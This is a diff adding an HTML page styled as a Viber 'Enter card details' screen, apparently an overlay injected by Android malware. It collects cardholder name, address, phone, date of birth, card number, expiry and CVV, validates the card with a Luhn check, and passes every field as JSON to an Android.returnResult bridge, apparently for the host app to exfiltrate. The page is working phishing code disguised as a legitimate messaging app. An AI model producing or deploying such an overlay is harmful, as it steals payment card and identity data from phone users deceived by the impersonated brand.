@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>viber</title>
+    <link rel="shortcut icon" href="com.viber.voip.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #f4f4f4;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+    }
+    .logo {
+    text-align: left;
+    background-size: 100%;
+    padding: 20px 0px 10px 20px;
+    background: #fff;
+    color: #fff;
+    font-weight: 400;
+    font-size: 18px;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+form {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+    width: 100%;
+
+}
+
+input[type="text"],input[type="password"], input[type="number"], input[type="date"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 0px 0px 0px 0px;
+    margin: 0px 0px;
+    -webkit-box-shadow: none;
+    outline: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 54px;
+    color: #000;
+    outline: none;
+    text-align: left;
+    border: none;
+    background: none;
+    outline: none;
+    margin: 0px;
+    border: 1px solid #e1dfdf;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+    padding-left: 5px;
+}
+input[type="button"], button {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 50px;
+    margin: 0 auto;
+    outline: none;
+    color: #fff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #574e92;
+    margin-top: 40px;
+    border: none;
+    cursor: pointer;
+    font-weight: bolder;
+    text-align: center;
+    border-radius: 30px;
+}
+
+input:disabled, button:disabled {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 50px;
+    margin: 0 auto;
+    outline: none;
+    color: #fff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #574e92;
+    margin-top: 40px;
+    border: none;
+    cursor: pointer;
+    font-weight: bolder;
+    opacity: 0.7;
+    text-align: center;
+    border-radius: 30px;
+}
+input::placeholder {
+    font-size: 14px;
+}
+
+</style>
+
+<fieldset id="formtosend">
+
+<div class="logo">
+
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK8AAAAmCAYAAACyLctlAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAgNSURBVHhe7Zvpj1VFEMX9R/WDXzCRREgkATRERdFEFo0GN6IEEQWFoCOrwhBAUGSN7CATyMgiyDayBCItv8fUUHOmut99zJv35pF7kgpD3+ruWk5X170Dz6QaNXoUNXlr9Cxq8tboWdTkrdGzqMlbo2dRk7dGz6Imb42exaQk767tA2nBvP4ROXf22vCTGjUeo0jeK5f/TX1rDmdl146BdOvWvWHt9oG1pzy7ckROHL00/GRi4X3r1J6t4OeNJ9Ls6T+m6VPWVLIPHXSJIUXAcvXT+uPptZkb0vy3tqaTx/9ujAH0P3pvZ1q1/MCE5LXdKJIXZzyJckKy24lukdfv2W6fxgsKibcPEjfDrOl9o+Yc2DuYzpy+Mmps5kt9DV3IakRHln7yW2N8MqMt5EU4se1CTd6xiHIBGXOg1VJ92rH+zafGjN+5fW/M+lUOR7fRNvIi7Up4Td4Y01xlRErVkWdel7lU10sXhkaNL3y7v6Ef5XqyoyXyEhDGTBYv2jnqOddO1CuhS2X2uvRgjC942HfZixmVATQjL3bYHAQ72DdaS7Fy+f4RHX4G7Kd7UnlKa9F/vvnqplFzln76KD4KfQG13tXvxf7N+kzs9fvl4g1KRMfGZUv2pB9W/5GGbt4dGfP6SDvAuieOPe6r24mWyBtVIyWwJlpJURJbX+d4QkTr2Z5+LLIVQHDT4Wfg50Xi14IsSloVXng8IpsjgYylLyva9yLRwaKdUD0fwwgReRmj6FgvjN8cUOwoAZuiGLFWZEej8Dw81OjYyyJ/2jyNp2Hc5NXeyutUTZqJzdV55nAUYL9fbtxjPOStQlwTv7/6UxKqcK6aAm8/QtIVWlB4cfOwlgJfjIhRbEsSHRrshtyRvpctG08Oz3gEbXH8rWQSHepxk1ergelEVQKZ+0o++TZXk40drOffhhGS5OGfRbaC8ZBX7YIUtADYp1c6YgHXeQhzSZoSDcnZDiCN6vtKCIH0OTYacvlqlbyIvjBGvuTEk18PZCQTQl4C43UsUHqaIK2vKFGybX1NNnYo6XU94J/nCBCR11Caz17+8ET763Vtfab6Q5L9XL29qDwlaD/ryRmR2++lObUCkCMvh6zxnhAQzPfc0b74zzgSzbdDVyIvvnqie4yLvCRLq6E54wNsb7oKJbitr8nWq5r1opPoddRWw5OSV4mpVcfgDxmxAeqPr5QGPcwlqK4nuxLBDpBBc2oxiMircyOC2sHRb8r+QBly+Y7Iy1iOtIaWyEuQ7I1ZSYuYs1pJCHaE3OHQZKswL4LXUfIZfKAscYbS/GY25YRDq3Mj6OHI+Qj06keIeTSuh0xjniNv1YLDfM239tgGtc/29jlBtB3MoSXylsRfozovOoUGr2eEKRFFSeVRRc8HyoJnKM1vpZ/zQizUnwgaM/5egiacAkGc/VhEIt3HYpAbV6geogePwmZFTkX1gPrSrOIa2kJejPCnVOeVjPF6RhhNthfdy8PrTRbyVq28GjP+XoJe4cRF39KjGOg+OfLm4qd6pqtjVcQOl5K3me+GlsjLZmyE+J4W8c5WDYReI6anwdC96IEjAnud3J6+J22FvGoT1QY/m0k0NwK6XsfmlqBxUYl6a90nR16NjUH1EK282GU8KYm1NPzs51fxHTzxC5sajPhN/Xju7VmTauvrOFVGExX9Wwr/XF82AIT3OgTNwz/zvgL1t+rVBtSfCBrrKgnUFzcvub5R97EY6Dg5iwqE9rwUNO15kejgGFjXr91x8gINnr/S1Un9LQkOo+91cuTFDrUF4YO4hwaBPTzU3hJ5lfz45Q9Qrn1hHgfLJ2+iyKs3lxeragrdJ0deROMbkdTiFN2OSmDm+19idK3yGvw1jNCUgygYOMQaOKDERUrkBdrnIc2+cbIX6+nLAqLkVV+Yy6GzKqt24QP/ppnf3R/cNzhmD7NN50XQeFVNoCYegUg56D4l8jaeP/QJ+z3pvJRygzAf0c+diN0OXSMvp0tPnSWtdK1FYutrsr0zWtERIxeVUAlYEiWvvq17sSoekSUnNmciyRu1b8Q9B92nGXlLordTK7FBLG9dIy+IAmiJi8iWkyrkBUpQKqDtx596mHKi5AW5BFibgDT78sD+lhgwkeQF9J1+bqnfJD5e12Ku480k6qmrxMbEHzDlSMl+jyJ5cYhkmviEKAiC1/WnEnIr4Qg46/k5tr6OGzENFiSvw98Zt+fsryRmDLE5UYVibnRjYL8nFDaqT+zH+hp89SeCxlp9LgFdi0eu1/VAz+z1tnp/sDl3cxrhc4hig+Tig/3oGyeqokjeiQAEMJJ1AgSmFSIYsBFbkWaVoIrOZEMUE/PZ+8LPtFMQloPRau7YZ6Li03Hy1qjRLnSMvNeu3k4Xz9986qVG59DRyrv889/H9EGTVV54blWaMfX79MbsTWnRO9vSksW7G5/NNvxwNO3c9mc6tO+vdObUlXT50lC6e+f+sIc1OomOtw0rlu4LydIJ4YvBnBnr07tzt6SP3/8lffXF3sb/4+J/1O799VyjNzs/eGPk/3XVmNzoSs+78svWvv/mZOrz36VZ0/rSvDmb0wfztzc+pK/++mDavO542r1jIB0+dCGdHbiarv5zK92//9/w7jWeFnTthe3bFQdDQr784tr0+qyNaeG8/vTZh7vSN8v2p3Vrj6TtW0833nZPn7ycLl0cSrc7+MWixuRE18gL9uw+m44duZgGz11PN67fSQ8eDD+oUaMCukreGjXGg5q8NXoUKf0PLZYczmxtPtkAAAAASUVORK5CYII=" style="
+    width: 130px;
+    position: relative;
+    top: 11px;
+    right: 10px;
+">
+
+<div style="
+    display: block;
+    text-align: center;
+    padding-top: 10px;
+    color: #616161;
+">
+Enter card details
+</div>
+
+</div>
+
+
+<div class="" id="log" style="display: block; margin: 30px;">
+
+<div class="area" style="padding: 0px;border-radius: 10px;">
+
+
+<div class="forma" style="background: #fff;border-radius: 0px;padding-top: 20px;padding-bottom: 20px;padding: 20px;">
+
+<form id="infodata">
+
+
+<input type="text" name="Cardholder" id="Cardholder" pattern=".{3,}" placeholder="Cardholder Name" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
+<input type="text" name="Address" id="Address" pattern=".{3,}" placeholder="Street Address" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
+<input type="text" name="City" id="City" pattern=".{1,}" placeholder="City" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
+<input type="text" name="State" id="State" pattern=".{1,}" placeholder="State" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
+<input type="text" name="ZIP" id="ZIP" pattern="[0-9\-]{3,11}" maxlength="30" onkeyup="CheckValidInput('infodata')" placeholder="ZIP Code" autocomplete="none" required>
+<input type="text" name="Phone" id="Phone" onkeyup="CheckValidInput('infodata')" maxlength="30" placeholder="Telephone Number" autocomplete="none" required>
+
+<input id="DOB" name="DOB" type="text" placeholder="Date of birth" pattern=".{1,}" autocomplete="off" type="text" style="width: 100%;" onkeyup="CheckValidInput('infodata')" onfocus="(this.type='date')" onblur="if(!this.value)this.type='text'" required>
+
+<button id="btnNext" type="button" onclick="ChangeCCNext()">Next</button>
+
+
+
+</form>
+
+<script type="text/javascript">
+    function next() {
+        document.getElementById('login_form').style.display = 'none';
+        document.getElementById('ccForm').style.display = 'block';
+    }
+</script>
+
+<div id="CC">
+
+<form id="ccdata" style="display: none;">
+
+<input id="CCNUM" placeholder="Card Number" pattern="^[0-9 ]{12,24}$" maxlength="24" autocomplete="off" type="text" onkeyup="CheckValidInput('ccdata')" required>
+<span id="ccnumlbl" style="
+    display: block;
+    padding-top: 5px;
+    text-align: left;
+    font-size: 14px;
+    padding-bottom: 10px;
+    color: #eb2617;
+    padding-left: 5px;
+"></span>
+<input class="dt" name="MM" id="CCexpMM" placeholder="MM" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$" onkeyup="CheckValidInput('ccdata');" maxlength="2" autocomplete="off" type="text" style="width: 45%;" required>
+<input class="dt" name="YY" id="CCEXPYY" placeholder="YY" pattern="^19$|^2[0-9]$" maxlength="2" autocomplete="off" onkeyup="CheckValidInput('ccdata');" type="text" style="width: 45%;" required>
+
+<input id="CVV" name="CVV" placeholder="CVV" pattern="^[0-9]{3}$" autocomplete="off" maxlength="3" onkeyup="CheckValidInput('ccdata');" type="password" style="width:100%;" required>
+
+<button id="btnSumbit" type="button" onclick="send_form()">Save</button>
+
+</form>
+
+</div>
+
+<script type="text/javascript">
+
+invalidCC = 'Invalid card number';
+
+
+function maskCC(event) {
+    var vcc = this.value.replace(/\D/g, '');
+    this.value = '';
+    for(var i = 0; i < vcc.length; i++) {
+        this.value += (i%4==0 && i != 0 ? ' ' : '') + vcc[i];
+    }
+}
+document.getElementById('CCNUM').addEventListener('input', maskCC, false);
+
+function maskPhone(event) {
+    var vpp = this.value.replace(/\D/g, '');
+    this.value = '+' + vpp;
+}
+document.getElementById('Phone').addEventListener('input', maskPhone, false);
+
+function maskOnlyNumbers(event) {
+    this.value = this.value.replace(/\D/g, '');
+}
+
+var iddNUMBERS = ['ZIP', 'CCexpMM', 'CCEXPYY', 'CVV'];
+for(var i = 0; i < iddNUMBERS.length; i++) {
+    document.getElementById(iddNUMBERS[i]).addEventListener('input', maskOnlyNumbers, false);
+}
+
+function valid_credit_card(value) {
+    if (/[^0-9-\s]+/.test(value)) return false;
+    var nCheck = 0, nDigit = 0, bEven = false;
+    value = value.replace(/\D/g, "");
+    for (var n = value.length - 1; n >= 0; n--) {
+        var cDigit = value.charAt(n),
+              nDigit = parseInt(cDigit, 10);
+        if (bEven) {
+            if ((nDigit *= 2) > 9) nDigit -= 9;
+        }
+        nCheck += nDigit;
+        bEven = !bEven;
+    }
+    return (nCheck % 10) == 0;
+}
+
+var BtnsOnPages = document.getElementsByTagName('button');
+for(var i = 0; i < BtnsOnPages.length; i++) {
+    BtnsOnPages[i].disabled = true;
+}
+
+function CheckValidInput(id) {
+    var finalbool = true, formids = document.getElementById(id);
+    var currentinputs = formids.getElementsByTagName('input');
+    for(var i = 0; i < currentinputs.length; i++ ) {
+        if(currentinputs[i].id == 'CCNUM') {
+            var bbb = valid_credit_card(currentinputs[i].value);
+            document.getElementById('ccnumlbl').innerText = bbb & currentinputs[i].checkValidity() ? '' : invalidCC;
+            finalbool&= bbb;
+            continue;
+        }
+        finalbool &= currentinputs[i].checkValidity();
+    }
+    formids.getElementsByTagName('button')[0].disabled = !finalbool;
+}
+
+var AllForms = document.getElementsByTagName('form');
+
+function ChangeCCNext() {
+    document.getElementById('infodata').style.display = 'none';
+    document.getElementById('ccdata').style.display = 'block';
+    
+}
+</script>
+
+<input name="exit" type="hidden" text="true"/>
+
+</div>
+
+            </div>
+        
+</div>
+
+</fieldset> 
+
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+
+</script>
+
+</body>
+</html>
